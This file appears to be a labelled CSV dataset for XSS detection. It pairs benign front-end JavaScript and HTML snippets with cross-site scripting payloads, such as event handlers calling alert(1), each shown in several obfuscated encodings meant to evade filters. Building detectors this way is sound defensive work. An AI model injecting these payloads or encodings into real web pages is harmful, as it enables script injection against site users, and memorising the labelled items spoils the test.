sample_id,variant_id,technique,payload_original,payload_obfuscated,label
3788,0,none,"_classcallcheck(this, pushpin); var _this47 = _possibleconstructorreturn(this, (pushpin.__proto__ || object.getprototypeof(pushpin)).call(this, pushpin, el, options)); _this47.el.m_pushpin = _this47;","_classcallcheck(this, pushpin); var _this47 = _possibleconstructorreturn(this, (pushpin.__proto__ || object.getprototypeof(pushpin)).call(this, pushpin, el, options)); _this47.el.m_pushpin = _this47;",0
3789,1,html_entities,"<isindex draggable=""true"" ondragstart=""alert(1)"">test</isindex>",&lt;isindex draggable=&quot;true&quot; ondragstart=&quot;alert(1)&quot;&gt;test&lt;/isindex&gt;,1
3789,2,urlencode,"<isindex draggable=""true"" ondragstart=""alert(1)"">test</isindex>",%3Cisindex%20draggable%3D%22true%22%20ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fisindex%3E,1
3789,3,comment_marker,"<isindex draggable=""true"" ondragstart=""alert(1)"">test</isindex>","<isindex draggable=""true"" ondragstart=""a/*OBF*/lert(1)"">test</isindex>",1
3790,1,whitespace_noise,<image onpointermove=alert(1)>xss</image>,< image onpointermove=alert(1)>  xss< /image> ,1
3790,2,base64,<image onpointermove=alert(1)>xss</image>,PGltYWdlIG9ucG9pbnRlcm1vdmU9YWxlcnQoMSk+eHNzPC9pbWFnZT4=,1
3790,3,html_then_urlencode,<image onpointermove=alert(1)>xss</image>,%26lt%3Bimage%20onpointermove%3Dalert%281%29%26gt%3Bxss%26lt%3B%2Fimage%26gt%3B,1
3791,1,urlencode,<svg><noembed onload=alert(1)></noembed>,%3Csvg%3E%3Cnoembed%20onload%3Dalert%281%29%3E%3C%2Fnoembed%3E,1
3791,2,html_entities,<svg><noembed onload=alert(1)></noembed>,&lt;svg&gt;&lt;noembed onload=alert(1)&gt;&lt;/noembed&gt;,1
3791,3,whitespace_noise,<svg><noembed onload=alert(1)></noembed>,<svg> <noembed onload=alert(1)><  /noembed>,1
3792,0,none,"$(document).on('click', '.card', function (e) { if ($(this).children('.card-reveal').length) { var $card = $(e.target).closest('.card');","$(document).on('click', '.card', function (e) { if ($(this).children('.card-reveal').length) { var $card = $(e.target).closest('.card');",0
3793,1,whitespace_noise,"<thead onkeydown=""alert(1)"" contenteditable>test</thead>","<  thead onkeydown=""alert(1)"" contenteditable>test<  /thead>",1
3793,2,html_then_urlencode,"<thead onkeydown=""alert(1)"" contenteditable>test</thead>",%26lt%3Bthead%20onkeydown%3D%26quot%3Balert%281%29%26quot%3B%20contenteditable%26gt%3Btest%26lt%3B%2Fthead%26gt%3B,1
3793,3,double_urlencode,"<thead onkeydown=""alert(1)"" contenteditable>test</thead>",%253Cthead%2520onkeydown%253D%2522alert%25281%2529%2522%2520contenteditable%253Etest%253C%252Fthead%253E,1
3794,0,none,"a >= k && (g.remaining ? (t = h, ""alternate"" === g.direction && (g.reversed = !g.reversed)) : (g.pause(), g.completed || (g.completed = !0, f(""complete""), ""promise"" in window && (p(), m = c()))), l = 0)","a >= k && (g.remaining ? (t = h, ""alternate"" === g.direction && (g.reversed = !g.reversed)) : (g.pause(), g.completed || (g.completed = !0, f(""complete""), ""promise"" in window && (p(), m = c()))), l = 0)",0
3795,1,comment_marker,"<script ="">"" src=""httx://.rocks/.js""></script>","<script ="">"" src=""httx://.rocks/.js""></script>",1
3795,2,urlencode,"<script ="">"" src=""httx://.rocks/.js""></script>",%3Cscript%20%3D%22%3E%22%20src%3D%22httx%3A%2F%2F.rocks%2F.js%22%3E%3C%2Fscript%3E,1
3795,3,whitespace_noise,"<script ="">"" src=""httx://.rocks/.js""></script>","<script ="">"" src=""httx://.rocks/.js""> </script>  ",1
3796,1,comment_marker,<ul id=x tabindex=1 onfocus=alert(1)></ul>,<ul id=x tabindex=1 onfocus=alert(1)></ul>,1
3796,2,urlencode,<ul id=x tabindex=1 onfocus=alert(1)></ul>,%3Cul%20id%3Dx%20tabindex%3D1%20onfocus%3Dalert%281%29%3E%3C%2Ful%3E,1
3796,3,html_then_urlencode,<ul id=x tabindex=1 onfocus=alert(1)></ul>,%26lt%3Bul%20id%3Dx%20tabindex%3D1%20onfocus%3Dalert%281%29%26gt%3B%26lt%3B%2Ful%26gt%3B,1
3797,0,none,_teardownswipeabletabs() { let $tabswrapper = this._tabscarousel.$el; this._tabscarousel.destroy();,_teardownswipeabletabs() { let $tabswrapper = this._tabscarousel.$el; this._tabscarousel.destroy();,0
3798,0,none,".map(element => collapse.getorcreateinstance(element, { toggle: false }))",".map(element => collapse.getorcreateinstance(element, { toggle: false }))",0
3799,1,urlencode,"<thead onkeyup=""alert(1)"" contenteditable>test</thead>",%3Cthead%20onkeyup%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fthead%3E,1
3799,2,html_entities,"<thead onkeyup=""alert(1)"" contenteditable>test</thead>",&lt;thead onkeyup=&quot;alert(1)&quot; contenteditable&gt;test&lt;/thead&gt;,1
3799,3,html_then_urlencode,"<thead onkeyup=""alert(1)"" contenteditable>test</thead>",%26lt%3Bthead%20onkeyup%3D%26quot%3Balert%281%29%26quot%3B%20contenteditable%26gt%3Btest%26lt%3B%2Fthead%26gt%3B,1
3800,0,none,"const allowedattributes = [].concat(allowlist['*'] || [], allowlist[elementname] || [])","const allowedattributes = [].concat(allowlist['*'] || [], allowlist[elementname] || [])",0
3801,0,none,"this.calendars[0].year = parseint(year, 10)","this.calendars[0].year = parseint(year, 10)",0
3802,0,none,scrolledy + bounding.height > window.innerheight - offset ) { edges.bottom = true;,scrolledy + bounding.height > window.innerheight - offset ) { edges.bottom = true;,0
3803,0,none,var centery = windowheight / 2; var isleft = originleft <= centerx; var isright = originleft > centerx;,var centery = windowheight / 2; var isleft = originleft <= centerx; var isright = originleft > centerx;,0
3804,0,none,"this.container.removeeventlistener('mousedown', this._handlecontainermousedownandtouchstartbound)","this.container.removeeventlistener('mousedown', this._handlecontainermousedownandtouchstartbound)",0
3805,0,none,value: function _handlecalendarclick(e) {,value: function _handlecalendarclick(e) {,0
3806,0,none,var $curritem = this.$el.find('.carousel-item').eq(this._wrap(this.center)),var $curritem = this.$el.find('.carousel-item').eq(this._wrap(this.center)),0
3807,0,none,"<li id=""cite_note-396""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-396"">^ </a> </b>","<li id=""cite_note-396""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-396"">^ </a> </b>",0
3808,0,none,if (parentdropdown.classlist.contains(class_name_dropup_center)) {,if (parentdropdown.classlist.contains(class_name_dropup_center)) {,0
3809,0,none,"let bounding = { left: newx, top: newy,","let bounding = { left: newx, top: newy,",0
3810,1,html_entities,"<style onbeforecut=""alert(1)"" contenteditable style=display:block>test</style>",&lt;style onbeforecut=&quot;alert(1)&quot; contenteditable style=display:block&gt;test&lt;/style&gt;,1
3810,2,comment_marker,"<style onbeforecut=""alert(1)"" contenteditable style=display:block>test</style>","<style on/*OBF*/beforecut=""alert(1)"" contenteditable style=display:block>test</style>",1
3810,3,html_then_urlencode,"<style onbeforecut=""alert(1)"" contenteditable style=display:block>test</style>",%26lt%3Bstyle%20onbeforecut%3D%26quot%3Balert%281%29%26quot%3B%20contenteditable%20style%3Ddisplay%3Ablock%26gt%3Btest%26lt%3B%2Fstyle%26gt%3B,1
3811,0,none,"<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 18.3 </li> </ul>","<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 18.3 </li> </ul>",0
3812,0,none,resultscontainer.append(resultdiv); }); };,resultscontainer.append(resultdiv); }); };,0
3813,0,none,"} _queuecallback(callback, element, isanimated = true) { executeaftertransition(callback, element, isanimated);","} _queuecallback(callback, element, isanimated = true) { executeaftertransition(callback, element, isanimated);",0
3814,1,base64,top[/al/.source+/ert/.source](1),dG9wWy9hbC8uc291cmNlKy9lcnQvLnNvdXJjZV0oMSk=,1
3814,2,whitespace_noise,top[/al/.source+/ert/.source](1),top[/  al/.source+/ert/.source]( 1),1
3814,3,comment_marker,top[/al/.source+/ert/.source](1),top[/al/.source+/ert/.source](1),1
3815,1,urlencode,"<data onmousemove=""alert(1)"">test</data>",%3Cdata%20onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fdata%3E,1
3815,2,comment_marker,"<data onmousemove=""alert(1)"">test</data>","<data onmousemove=""alert(1)"">test/*OBF*/</data>",1
3815,3,double_urlencode,"<data onmousemove=""alert(1)"">test</data>",%253Cdata%2520onmousemove%253D%2522alert%25281%2529%2522%253Etest%253C%252Fdata%253E,1
3816,0,none,"...this._config, content, extraclass: this._resolvepossiblefunction(this._config.customclass)","...this._config, content, extraclass: this._resolvepossiblefunction(this._config.customclass)",0
3817,0,none,const backdrop = document.createelement('div'); backdrop.classname = this._config.classname; if (this._config.isanimated) {,const backdrop = document.createelement('div'); backdrop.classname = this._config.classname; if (this._config.isanimated) {,0
3818,0,none,"<li id=""cite_note-ai_at_stanford_in_the_60s-161""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-ai_at_stanford_in_the_60s_161-0"">^ </a> </b>","<li id=""cite_note-ai_at_stanford_in_the_60s-161""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-ai_at_stanford_in_the_60s_161-0"">^ </a> </b>",0
3819,1,whitespace_noise,"<span oncopy=""alert(1)"" contenteditable>test</span>","<span oncopy=""alert(1)"" contenteditable>test</ span>",1
3819,2,double_urlencode,"<span oncopy=""alert(1)"" contenteditable>test</span>",%253Cspan%2520oncopy%253D%2522alert%25281%2529%2522%2520contenteditable%253Etest%253C%252Fspan%253E,1
3819,3,urlencode,"<span oncopy=""alert(1)"" contenteditable>test</span>",%3Cspan%20oncopy%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fspan%3E,1
3820,0,none,}; const findshadowroot = element => { if (!document.documentelement.attachshadow) {,}; const findshadowroot = element => { if (!document.documentelement.attachshadow) {,0
3821,1,base64,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><input id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></input>",PHN0eWxlPkBrZXlmcmFtZXMgeHtmcm9tIHtsZWZ0OjA7fXRvIHtsZWZ0OiAxMDAwcHg7fX06dGFyZ2V0IHthbmltYXRpb246MTBzIGVhc2UtaW4tb3V0IDBzIDEgeDt9PC9zdHlsZT48aW5wdXQgaWQ9eCBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7IiBvbmFuaW1hdGlvbmNhbmNlbD0iYWxlcnQoMSkiPjwvaW5wdXQ+,1
3821,2,html_then_urlencode,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><input id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></input>",%26lt%3Bstyle%26gt%3B%40keyframes%20x%7Bfrom%20%7Bleft%3A0%3B%7Dto%20%7Bleft%3A%201000px%3B%7D%7D%3Atarget%20%7Banimation%3A10s%20ease-in-out%200s%201%20x%3B%7D%26lt%3B%2Fstyle%26gt%3B%26lt%3Binput%20id%3Dx%20style%3D%26quot%3Bposition%3Aabsolute%3B%26quot%3B%20onanimationcancel%3D%26quot%3Balert%281%29%26quot%3B%26gt%3B%26lt%3B%2Finput%26gt%3B,1
3821,3,double_urlencode,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><input id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></input>",%253Cstyle%253E%2540keyframes%2520x%257Bfrom%2520%257Bleft%253A0%253B%257Dto%2520%257Bleft%253A%25201000px%253B%257D%257D%253Atarget%2520%257Banimation%253A10s%2520ease-in-out%25200s%25201%2520x%253B%257D%253C%252Fstyle%253E%253Cinput%2520id%253Dx%2520style%253D%2522position%253Aabsolute%253B%2522%2520onanimationcancel%253D%2522alert%25281%2529%2522%253E%253C%252Finput%253E,1
3822,0,none,"return } eventhandler.off(this._config.target, event_click)","return } eventhandler.off(this._config.target, event_click)",0
3823,0,none,"var canescapeclipping = ['absolute', 'fixed'].indexof(getcomputedstyle$1(element).position) >= 0; var clipperelement = canescapeclipping && ishtmlelement(element) ? getoffsetparent(element) : element; if (!iselement(clipperelement)) {","var canescapeclipping = ['absolute', 'fixed'].indexof(getcomputedstyle$1(element).position) >= 0; var clipperelement = canescapeclipping && ishtmlelement(element) ? getoffsetparent(element) : element; if (!iselement(clipperelement)) {",0
3824,1,urlencode,<map id=x tabindex=1 onfocusin=alert(1)></map>,%3Cmap%20id%3Dx%20tabindex%3D1%20onfocusin%3Dalert%281%29%3E%3C%2Fmap%3E,1
3824,2,html_then_urlencode,<map id=x tabindex=1 onfocusin=alert(1)></map>,%26lt%3Bmap%20id%3Dx%20tabindex%3D1%20onfocusin%3Dalert%281%29%26gt%3B%26lt%3B%2Fmap%26gt%3B,1
3824,3,comment_marker,<map id=x tabindex=1 onfocusin=alert(1)></map>,<map id=x tab/*OBF*/index=1 onfocusin=alert(1)></map/*OBF*/>,1
3825,1,base64,<tt onfocusout=alert(1) tabindex=1 id=x></tt><input autofocus>,PHR0IG9uZm9jdXNvdXQ9YWxlcnQoMSkgdGFiaW5kZXg9MSBpZD14PjwvdHQ+PGlucHV0IGF1dG9mb2N1cz4=,1
3825,2,urlencode,<tt onfocusout=alert(1) tabindex=1 id=x></tt><input autofocus>,%3Ctt%20onfocusout%3Dalert%281%29%20tabindex%3D1%20id%3Dx%3E%3C%2Ftt%3E%3Cinput%20autofocus%3E,1
3825,3,html_then_urlencode,<tt onfocusout=alert(1) tabindex=1 id=x></tt><input autofocus>,%26lt%3Btt%20onfocusout%3Dalert%281%29%20tabindex%3D1%20id%3Dx%26gt%3B%26lt%3B%2Ftt%26gt%3B%26lt%3Binput%20autofocus%26gt%3B,1
3826,1,urlencode,"<thead onmouseout=""alert(1)"">test</thead>",%3Cthead%20onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fthead%3E,1
3826,2,whitespace_noise,"<thead onmouseout=""alert(1)"">test</thead>","<thead onmouseout=""  alert(1)"">test</thead>",1
3826,3,html_then_urlencode,"<thead onmouseout=""alert(1)"">test</thead>",%26lt%3Bthead%20onmouseout%3D%26quot%3Balert%281%29%26quot%3B%26gt%3Btest%26lt%3B%2Fthead%26gt%3B,1
3827,0,none,"toggle(selector_dropdown_menu, class_name_show); outerelem.setattribute('aria-expanded', open); }","toggle(selector_dropdown_menu, class_name_show); outerelem.setattribute('aria-expanded', open); }",0
3828,1,html_entities,"<plaintext onkeypress=""alert(1)"" contenteditable>test</plaintext>",&lt;plaintext onkeypress=&quot;alert(1)&quot; contenteditable&gt;test&lt;/plaintext&gt;,1
3828,2,base64,"<plaintext onkeypress=""alert(1)"" contenteditable>test</plaintext>",PHBsYWludGV4dCBvbmtleXByZXNzPSJhbGVydCgxKSIgY29udGVudGVkaXRhYmxlPnRlc3Q8L3BsYWludGV4dD4=,1
3828,3,whitespace_noise,"<plaintext onkeypress=""alert(1)"" contenteditable>test</plaintext>","<plaintext onkeypress=""alert(  1)"" contenteditable>  test</plaintext> ",1
3829,0,none,"left: el.offsetleft, top: el.offsettop };","left: el.offsetleft, top: el.offsettop };",0
3830,1,html_entities,"<ins onmouseout=""alert(1)"">test</ins>",&lt;ins onmouseout=&quot;alert(1)&quot;&gt;test&lt;/ins&gt;,1
3830,2,whitespace_noise,"<ins onmouseout=""alert(1)"">test</ins>","<  ins onmouseout=""alert(1)"">test</ins>",1
3830,3,base64,"<ins onmouseout=""alert(1)"">test</ins>",PGlucyBvbm1vdXNlb3V0PSJhbGVydCgxKSI+dGVzdDwvaW5zPg==,1
3831,0,none,"var _this57 = _possibleconstructorreturn(this, (timepicker.__proto__ || object.getprototypeof(timepicker)).call(this, timepicker, el, options))","var _this57 = _possibleconstructorreturn(this, (timepicker.__proto__ || object.getprototypeof(timepicker)).call(this, timepicker, el, options))",0
3832,0,none,"event.stoppropagation(); var moveevent = attachevent(actions.move, document.documentelement, eventmove, { startcalcpoint: event.calcpoint,","event.stoppropagation(); var moveevent = attachevent(actions.move, document.documentelement, eventmove, { startcalcpoint: event.calcpoint,",0
3833,0,none,"scaley: 0.3, duration: this.options.outduration, easing: 'easeoutquint',","scaley: 0.3, duration: this.options.outduration, easing: 'easeoutquint',",0
3834,1,whitespace_noise,"<title draggable=""true"" ondragstart=""alert(1)"">test</title>","<title draggable="" true"" ondragstart=""alert( 1)"">test</title>",1
3834,2,html_entities,"<title draggable=""true"" ondragstart=""alert(1)"">test</title>",&lt;title draggable=&quot;true&quot; ondragstart=&quot;alert(1)&quot;&gt;test&lt;/title&gt;,1
3834,3,double_urlencode,"<title draggable=""true"" ondragstart=""alert(1)"">test</title>",%253Ctitle%2520draggable%253D%2522true%2522%2520ondragstart%253D%2522alert%25281%2529%2522%253Etest%253C%252Ftitle%253E,1
3835,0,none,"return [].concat(...element.prototype.queryselectorall.call(element, selector)); }, findone(selector, element = document.documentelement) {","return [].concat(...element.prototype.queryselectorall.call(element, selector)); }, findone(selector, element = document.documentelement) {",0
3836,0,none,"this._toggledropdown(element, true)","this._toggledropdown(element, true)",0
3837,0,none,"'use strict'; let _defaults = { top: 0,","'use strict'; let _defaults = { top: 0,",0
3838,1,comment_marker,"<option onpaste=""alert(1)"" contenteditable>test</option>","<option onpaste=""alert(1)"" contenteditable>test</op/*OBF*/tion>",1
3838,2,base64,"<option onpaste=""alert(1)"" contenteditable>test</option>",PG9wdGlvbiBvbnBhc3RlPSJhbGVydCgxKSIgY29udGVudGVkaXRhYmxlPnRlc3Q8L29wdGlvbj4=,1
3838,3,html_entities,"<option onpaste=""alert(1)"" contenteditable>test</option>",&lt;option onpaste=&quot;alert(1)&quot; contenteditable&gt;test&lt;/option&gt;,1
3839,0,none,transitionmovement: 10 }; var tooltip = function (_component7) {,transitionmovement: 10 }; var tooltip = function (_component7) {,0
3840,1,double_urlencode,"<textarea ondblclick=""alert(1)"">test</textarea>",%253Ctextarea%2520ondblclick%253D%2522alert%25281%2529%2522%253Etest%253C%252Ftextarea%253E,1
3840,2,html_then_urlencode,"<textarea ondblclick=""alert(1)"">test</textarea>",%26lt%3Btextarea%20ondblclick%3D%26quot%3Balert%281%29%26quot%3B%26gt%3Btest%26lt%3B%2Ftextarea%26gt%3B,1
3840,3,html_entities,"<textarea ondblclick=""alert(1)"">test</textarea>",&lt;textarea ondblclick=&quot;alert(1)&quot;&gt;test&lt;/textarea&gt;,1
3841,0,none,"<ul><li><a href=""#citerefrussellnorvig2003"">russell &amp; norvig 2003 </a>, p.&#160;964 </li>","<ul><li><a href=""#citerefrussellnorvig2003"">russell &amp; norvig 2003 </a>, p.&#160;964 </li>",0
3842,1,urlencode,"<* onmouseout=""alert(1)"" style=display:block>test</*>",%3C%2A%20onmouseout%3D%22alert%281%29%22%20style%3Ddisplay%3Ablock%3Etest%3C%2F%2A%3E,1
3842,2,double_urlencode,"<* onmouseout=""alert(1)"" style=display:block>test</*>",%253C%252A%2520onmouseout%253D%2522alert%25281%2529%2522%2520style%253Ddisplay%253Ablock%253Etest%253C%252F%252A%253E,1
3842,3,html_then_urlencode,"<* onmouseout=""alert(1)"" style=display:block>test</*>",%26lt%3B%2A%20onmouseout%3D%26quot%3Balert%281%29%26quot%3B%20style%3Ddisplay%3Ablock%26gt%3Btest%26lt%3B%2F%2A%26gt%3B,1
3843,0,none,let taptargettextright = 0,let taptargettextright = 0,0
3844,1,whitespace_noise,"<wbr onclick=""alert(1)"">test</wbr>","<wbr onclick=""alert(1)""> test</  wbr>",1
3844,2,base64,"<wbr onclick=""alert(1)"">test</wbr>",PHdiciBvbmNsaWNrPSJhbGVydCgxKSI+dGVzdDwvd2JyPg==,1
3844,3,urlencode,"<wbr onclick=""alert(1)"">test</wbr>",%3Cwbr%20onclick%3D%22alert%281%29%22%3Etest%3C%2Fwbr%3E,1
3845,0,none,"}function ea(a, c) {","}function ea(a, c) {",0
3846,0,none,return domelem.m_scrollspy; } destroy() {,return domelem.m_scrollspy; } destroy() {,0
3847,0,none,"href: 'http://materializecss.com/waves.html', title: 'waves', body: 'waves is an external library that weve included in materialize to allow us to create the ink effect outlined in material design'","href: 'http://materializecss.com/waves.html', title: 'waves', body: 'waves is an external library that weve included in materialize to allow us to create the ink effect outlined in material design'",0
3848,0,none,"this.modalel.id = 'modal-' + this.id; this.modal = m.modal.init(this.modalel, { oncloseend: () => {","this.modalel.id = 'modal-' + this.id; this.modal = m.modal.init(this.modalel, { oncloseend: () => {",0
3849,0,none,"if (doc.readystate !== ""loading"") { fn(); } else {","if (doc.readystate !== ""loading"") { fn(); } else {",0
